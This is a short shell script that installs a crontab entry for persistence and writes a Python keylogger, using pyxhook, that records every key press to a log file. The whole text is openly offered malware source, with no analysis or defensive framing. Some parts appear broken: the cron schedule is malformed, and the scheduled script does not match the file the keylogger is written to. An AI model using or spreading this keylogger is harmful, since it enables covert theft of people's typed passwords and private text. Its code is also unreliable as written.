#write out current crontab
crontab -l > mycron
#echo new cron into cron file
echo "*1 * * * * sh /tmp/thisThing.sh" >> mycron
#install new cron file
crontab mycron
rm mycron


# places the python script in a local file which can then be run
echo "import os 
import pyxhook 
log_file = os.environ.get( 
    'pylogger_file', 
    os.path.expanduser('~/Desktop/file.log') 
) 

  
# Allow clearing the log file on start, if pylogger_clean is defined. 
if os.environ.get('pylogger_clean', None) is not None: 
    try: 
        os.remove(log_file) 
    except EnvironmentError: 
       # File does not exist, or no permissions. 
        pass
  
#creating key pressing event and saving it into log file 
def OnKeyPress(event): 
    with open(log_file, 'a') as f: 
        f.write('{}\n'.format(event.Key))

# create a hook manager object 
new_hook = pyxhook.HookManager() 
new_hook.KeyDown = OnKeyPress 
# set the hook 
new_hook.HookKeyboard() 
try: 
    new_hook.start()         # start the hook 
except KeyboardInterrupt: 
    # User cancelled from command line. 
    pass
except Exception as ex: 
    # Write exceptions to the log file, for analysis later. 
    msg = 'Error while catching events:\n  {}'.format(ex) 
    pyxhook.print_err(msg) 
    with open(log_file, 'a') as f: 
        f.write('\n{}'.format(msg))
">> TheLoggingFileYouWant
 